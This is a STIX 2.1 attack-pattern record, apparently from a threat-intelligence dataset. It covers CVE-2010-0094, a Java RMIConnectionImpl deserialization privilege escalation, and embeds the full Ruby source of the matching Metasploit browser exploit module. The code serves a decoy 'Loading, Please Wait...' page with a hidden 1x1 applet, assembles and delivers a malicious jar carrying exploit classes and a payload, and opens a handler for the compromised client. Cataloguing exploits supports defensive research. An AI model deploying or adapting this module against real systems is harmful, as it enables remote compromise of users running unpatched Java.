{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a4637e83-259c-4431-aea0-d4521d45f3e8",
    "created": "2024-08-14T17:05:47.682047Z",
    "modified": "2024-08-14T17:05:47.682051Z",
    "name": "Java RMIConnectionImpl Deserialization Privilege Escalation",
    "description": " This module exploits a vulnerability in the Java Runtime Environment that allows to deserialize a MarshalledObject containing a custom classloader under a privileged context. The vulnerability affects version 6 prior to update 19 and version 5 prior to update 23.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/java_rmi_connection_impl.rb",
            "external_id": "java_rmi_connection_impl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0094"
        },
        {
            "source_name": "reference",
            "url": "http://slightlyrandombrokenthoughts.blogspot.com/2010/04/java-rmiconnectionimpl-deserialization.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #\n  # Superceded by java_trusted_chain\n  #\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({ :javascript => false })\n\n  def initialize( info = {} )\n\n    super( update_info( info,\n      'Name'          => 'Java RMIConnectionImpl Deserialization Privilege Escalation',\n      'Description'   => %q{\n      This module exploits a vulnerability in the Java Runtime Environment\n      that allows to deserialize a MarshalledObject containing a custom\n      classloader under a privileged context. The vulnerability affects\n      version 6 prior to update 19 and version 5 prior to update 23.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        => [\n        'Sami Koivu', # Discovery\n        'Matthias Kaiser', # PoC\n        'egypt' # metasploit module\n      ],\n      'References'    =>\n      [\n        [ 'CVE', '2010-0094' ],\n        [ 'OSVDB', '63484' ],\n        [ 'URL', 'http://slightlyrandombrokenthoughts.blogspot.com/2010/04/java-rmiconnectionimpl-deserialization.html' ],\n      ],\n      'Platform'      => [ 'java' ],\n      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },\n      'Targets'       =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Arch' => ARCH_JAVA,\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-03-31'\n      ))\n  end\n\n\n  def on_request_uri( cli, request )\n    if not request.uri.match(/\\.jar$/i)\n      if not request.uri.match(/\\/$/)\n        send_redirect(cli, get_resource() + '/', '')\n        return\n      end\n\n      print_status(\"#{self.name} handling request\")\n\n      send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })\n      return\n    end\n\n    paths = [\n      [ \"Exploit.class\" ],\n      [ \"Exploit$1.class\" ],\n      [ \"Exploit$1$1.class\" ],\n      [ \"Exploit$2.class\" ],\n      [ \"Payloader.class\" ],\n      [ \"PayloadClassLoader.class\" ],\n      [ \"payload.ser\" ],\n    ]\n\n    p = regenerate_payload(cli)\n    jar = p.encoded_jar\n    paths.each do |path|\n      1.upto(path.length - 1) do |idx|\n        full = path[0,idx].join(\"/\") + \"/\"\n        if !(jar.entries.map{|e|e.name}.include?(full))\n          jar.add_file(full, '')\n        end\n      end\n      fd = File.open(File.join( Msf::Config.data_directory, \"exploits\", \"cve-2010-0094\", path ), \"rb\")\n      data = fd.read(fd.stat.size)\n      jar.add_file(path.join(\"/\"), data)\n      fd.close\n    end\n\n    print_status(\"Sending Applet.jar\")\n    send_response(cli, jar.pack, { 'Content-Type' => \"application/octet-stream\" })\n\n    handler(cli)\n  end\n\n  def generate_html\n    html  = \"<html><head><title>Loading, Please Wait...</title></head>\"\n    html += \"<body><center><p>Loading, Please Wait...</p></center>\"\n    html += \"<applet archive=\\\"Exploit.jar\\\" code=\\\"Exploit.class\\\" width=\\\"1\\\" height=\\\"1\\\">\"\n    html += \"</applet></body></html>\"\n    return html\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-03-31",
    "x_mitre_platforms": [
        "[ 'java' ]"
    ]
}